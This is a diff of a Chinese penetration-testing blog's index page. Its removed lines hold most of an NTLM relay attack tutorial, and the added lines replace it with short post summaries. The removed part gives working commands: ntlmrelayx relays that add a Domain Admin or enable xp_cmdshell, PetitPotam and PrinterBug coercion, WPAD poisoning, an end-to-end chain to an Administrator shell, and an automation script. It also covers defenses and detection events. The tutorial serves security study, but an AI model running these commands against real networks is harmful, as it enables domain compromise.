-<h3 id="4-3-中继到LDAP（高危）"><a href="#4-3-中继到LDAP（高危）" class="headerlink" title="4.3 中继到LDAP（高危）"></a>4.3 中继到LDAP（高危）</h3><p>LDAP中继可直接修改Active Directory对象：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转储ADCS</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t ldap://dc01.corp.local --dump-adcs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于资源的约束委派（RBCD）攻击</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t ldap://dc01.corp.local \</span><br><span class="line">    --delegate-access --escalate-user <span class="string">&quot;attacker-machine\$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加域管（需高权限账户触发认证）</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t ldap://dc01.corp.local \</span><br><span class="line">    --add-user relayadmin Relay@Passw0rd --add-group <span class="string">&quot;Domain Admins&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-4-中继到MSSQL"><a href="#4-4-中继到MSSQL" class="headerlink" title="4.4 中继到MSSQL"></a>4.4 中继到MSSQL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t mssql://192.168.1.100:1433 \</span><br><span class="line">    -q <span class="string">&quot;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;EXEC xp_cmdshell &#x27;whoami&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="五、强制认证——主动触发NTLM请求"><a href="#五、强制认证——主动触发NTLM请求" class="headerlink" title="五、强制认证——主动触发NTLM请求"></a>五、强制认证——主动触发NTLM请求</h2><p>除了被动等待毒化命中，还可通过Windows RPC接口主动强制目标发起认证。</p>
-<h3 id="5-1-PrinterBug（MS-RPRN）"><a href="#5-1-PrinterBug（MS-RPRN）" class="headerlink" title="5.1 PrinterBug（MS-RPRN）"></a>5.1 PrinterBug（MS-RPRN）</h3><p>利用打印后台处理程序RPC接口，调用<code>RpcRemoteFindFirstPrinterChangeNotificationEx</code>将攻击者IP设为通知回调地址：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py corp.local/user:password@192.168.1.50 192.168.1.99</span><br><span class="line"><span class="comment"># 参数：目标IP → 攻击者IP</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-2-PetitPotam（MS-EFSRPC）"><a href="#5-2-PetitPotam（MS-EFSRPC）" class="headerlink" title="5.2 PetitPotam（MS-EFSRPC）"></a>5.2 PetitPotam（MS-EFSRPC）</h3><p>利用加密文件系统远程协议，传入恶意UNC路径<code>\\192.168.1.99\share\file</code>，目标SYSTEM账户即发起NTLM认证：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 petitpotam.py -d corp.local -u user -p password 192.168.1.99 192.168.1.50</span><br><span class="line"><span class="comment"># 参数：攻击者IP → 目标IP</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-3-DFSCrack"><a href="#5-3-DFSCrack" class="headerlink" title="5.3 DFSCrack"></a>5.3 DFSCrack</h3><p>通过<code>NetrDfsAddStdRoot</code>接口添加指向攻击者的DFS根，触发认证：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dfscrack.py 192.168.1.50 192.168.1.99</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-对比总结"><a href="#5-4-对比总结" class="headerlink" title="5.4 对比总结"></a>5.4 对比总结</h3><table>
-<thead>
-<tr>
-<th>方法</th>
-<th>所需权限</th>
-<th>触发账户</th>
-<th>覆盖范围</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>PrinterBug</td>
-<td>任意域用户</td>
-<td>计算机账户</td>
-<td>广</td>
-</tr>
-<tr>
-<td>PetitPotam</td>
-<td>任意域用户</td>
-<td>SYSTEM</td>
-<td>广</td>
-</tr>
-<tr>
-<td>DFSCrack</td>
-<td>任意域用户</td>
-<td>计算机账户</td>
-<td>窄</td>
-</tr>
-</tbody></table>
-<h2 id="六、WPAD投毒攻击"><a href="#六、WPAD投毒攻击" class="headerlink" title="六、WPAD投毒攻击"></a>六、WPAD投毒攻击</h2><p>浏览器自动发现代理时，依次通过DHCP、DNS、LLMNR查询<code>wpad</code>主机。Responder响应并返回恶意wpad.dat，将自身设为代理，浏览器通过代理发请求时触发NTLM认证。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">受害者浏览器</span><br><span class="line">     |  (1) 查询WPAD服务器</span><br><span class="line">     v</span><br><span class="line">Responder冒充WPAD → 返回 wpad.dat: PROXY 攻击者IP:3128</span><br><span class="line">     |</span><br><span class="line">     v</span><br><span class="line">浏览器配置代理 → HTTP请求经代理 → 攻击者要求NTLM认证</span><br><span class="line">     |</span><br><span class="line">     v</span><br><span class="line">浏览器自动发送Net-NTLM Hash → ntlmrelayx中继到目标</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I eth0 -wFb   <span class="comment"># -w:WPAD代理 -F:强制认证 -b:Basic认证头</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="七、完整攻击链演示"><a href="#七、完整攻击链演示" class="headerlink" title="七、完整攻击链演示"></a>七、完整攻击链演示</h2><h3 id="7-1-场景拓扑"><a href="#7-1-场景拓扑" class="headerlink" title="7.1 场景拓扑"></a>7.1 场景拓扑</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Kali 192.168.1.99]  -----------&gt;  [DC01 192.168.1.2]  SMB签名: True</span><br><span class="line">       | 中继</span><br><span class="line">       v</span><br><span class="line">[FILE01 192.168.1.50]  &lt;---------  [WIN10 192.168.1.100]</span><br><span class="line"> SMB签名: False                    Domain Admin已登录</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-2-攻击步骤"><a href="#7-2-攻击步骤" class="headerlink" title="7.2 攻击步骤"></a>7.2 攻击步骤</h3><p><strong>终端1 — Responder毒化：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I eth0 -A</span><br></pre></td></tr></table></figure>
-
-<p><strong>终端2 — ntlmrelayx中继：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SMB中继 + SOCKS代理留存</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或 LDAP RBCD攻击</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t ldap://192.168.1.2 \</span><br><span class="line">    --delegate-access --escalate-user <span class="string">&quot;attacker-machine\$&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>终端3 — 触发强制认证：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 petitpotam.py -d corp.local -u user -p <span class="string">&#x27;Passw0rd&#x27;</span> \</span><br><span class="line">    192.168.1.99 192.168.1.50</span><br></pre></td></tr></table></figure>
-
-<p><strong>利用中继结果：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SMB中继 → SOCKS代理</span></span><br><span class="line">proxychains crackmapexec smb 192.168.1.50 -u <span class="string">&#x27;FILE01$&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line"></span><br><span class="line"><span class="comment"># LDAP RBCD → 申请ST票据</span></span><br><span class="line">impacket-getST -spn cifs/FILE01.corp.local -impersonate Administrator \</span><br><span class="line">    corp.local/<span class="string">&#x27;attacker-machine$&#x27;</span> -no-pass</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator.ccache</span><br><span class="line">impacket-smbexec -k -no-pass Administrator@FILE01.corp.local</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-3-自动化脚本"><a href="#7-3-自动化脚本" class="headerlink" title="7.3 自动化脚本"></a>7.3 自动化脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ATTACKER_IP=<span class="string">&quot;192.168.1.99&quot;</span></span><br><span class="line">TARGETS=<span class="string">&quot;relay_targets.txt&quot;</span></span><br><span class="line"></span><br><span class="line">crackmapexec smb 192.168.1.0/24 --gen-relay-list <span class="variable">$TARGETS</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -A &amp;</span><br><span class="line"><span class="built_in">sleep</span> 2</span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -tf <span class="variable">$TARGETS</span> -smb2support -socks &amp;</span><br><span class="line"><span class="built_in">sleep</span> 3</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] 触发: python3 petitpotam.py &lt;target&gt; <span class="variable">$ATTACKER_IP</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] 连接: proxychains bash&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="八、防御与加固"><a href="#八、防御与加固" class="headerlink" title="八、防御与加固"></a>八、防御与加固</h2><p><strong>核心措施：</strong></p>
-<ol>
-<li><strong>强制SMB签名</strong> — 组策略 <code>Microsoft网络服务器: 对通信进行数字签名(始终) = 已启用</code></li>
-<li><strong>禁用LLMNR&#x2F;NBT-NS</strong> — 组策略 <code>关闭多播名称解析 = 已启用</code>，禁用NetBIOS over TCP&#x2F;IP</li>
-<li><strong>启用EPA</strong> — 对LDAP&#x2F;HTTP强制Channel Binding Token验证</li>
-<li><strong>补丁管理</strong> — 修复MS-RPRN、MS-EFSRPC相关漏洞</li>
-<li><strong>网络分段</strong> — 限制非必要的东西向SMB&#x2F;RPC流量</li>
-</ol>
-<p><strong>检测特征：</strong></p>
-<table>
-<thead>
-<tr>
-<th>检测点</th>
-<th>日志来源</th>
-<th>Event ID</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LLMNR&#x2F;NBT-NS异常响应</td>
-<td>Sysmon</td>
-<td>22</td>
-</tr>
-<tr>
-<td>大量NTLM认证失败</td>
-<td>Security</td>
-<td>4625</td>
-</tr>
-<tr>
-<td>异常UNC路径访问</td>
-<td>Sysmon</td>
-<td>3</td>
-</tr>
-<tr>
-<td>EFSRPC异常调用</td>
-<td>Security</td>
-<td>5140</td>
-</tr>
-<tr>
-<td>非授权WPAD请求</td>
-<td>防火墙&#x2F;代理</td>
-<td>HTTP 407</td>
-</tr>
-</tbody></table>
-<h2 id="九、工具速查"><a href="#九、工具速查" class="headerlink" title="九、工具速查"></a>九、工具速查</h2><table>
-<thead>
-<tr>
-<th>工具</th>
-<th>用途</th>
-<th>关键参数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>responder</code></td>
-<td>名称解析毒化</td>
-<td><code>-I eth0 -A</code></td>
-</tr>
-<tr>
-<td><code>impacket-ntlmrelayx</code></td>
-<td>NTLM中继引擎</td>
-<td><code>-tf targets -smb2support -socks</code></td>
-</tr>
-<tr>
-<td><code>crackmapexec</code></td>
-<td>SMB签名扫描</td>
-<td><code>--gen-relay-list</code></td>
-</tr>
-<tr>
-<td><code>printerbug.py</code></td>
-<td>PrinterBug强制认证</td>
-<td><code>domain/user:pass@target attacker</code></td>
-</tr>
-<tr>
-<td><code>petitpotam.py</code></td>
-<td>EFSRPC强制认证</td>
-<td><code>attacker_ip target_ip</code></td>
-</tr>
-<tr>
-<td><code>RunFinger.py</code></td>
-<td>SMB签名探测</td>
-<td><code>-i 192.168.1.0/24</code></td>
-</tr>
-</tbody></table>
-<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>NTLM中继攻击的威力根植于协议设计缺陷——认证消息可被透明转发而无需知晓原始凭据。本文从NTLM认证流程出发，覆盖了SMB签名探测、Responder毒化、SMB&#x2F;HTTP&#x2F;LDAP&#x2F;MSSQL多协议中继、PrinterBug&#x2F;PetitPotam&#x2F;DFSCrack强制认证、WPAD投毒等关键技术。</p>
-<p><strong>关键要点：</strong></p>
-<ol>
-<li>中继不等于破解 — 转发整个认证会话即可，无需离线破解Hash</li>
-<li>签名是命门 — 目标未强制SMB签名是成功的根本前提</li>
-<li>LDAP中继危害最大 — 可直接添加域管、配置委派权限</li>
-<li>强制认证扩展攻击面 — 即使网络安静也能主动触发</li>
-<li>防御核心 — SMB签名 + 禁用LLMNR&#x2F;NBT-NS + EPA + 及时补丁</li>
-</ol>
-<blockquote>
-<p><strong>再次声明：本文所有内容仅供安全研究与授权测试参考，严禁用于非法入侵。请严格遵守《网络安全法》及相关法律法规。</strong></p>
-</blockquote>
-
+          <p>NTLM 中继攻击——Responder 监听、ntlmrelayx 中继与强制认证利用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Intranet-NTLM-relay/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -2503,7 +1253,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -2525,10 +1275,102 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>存储型XSS（Stored XSS）将恶意脚本持久化到服务端，受害者每次访问页面都会触发，不经二次请求即可扩大影响面。文章覆盖评论/富文本/个人资料等实战挖掘场景、存储上下文的过滤绕过技巧、Beef/XSSHunter 平台联动、HttpOnly 绕过与 Cookie 窃取、SRC 真实案例复盘，以及 CSP + 输出编码的纵深防御方案。</p>
+          <p>存储型XSS挖掘与利用——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/XSS-stored-practical/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-methodology/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Windows-privesc-methodology/" class="post-title-link" itemprop="url">Windows 提权方法论与工具链</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-02-15T08:00:00+08:00">2025-02-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Windows 提权方法论与工具链——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Windows-privesc-methodology/">
                 阅读全文 &raquo;
               </a>
             </div>
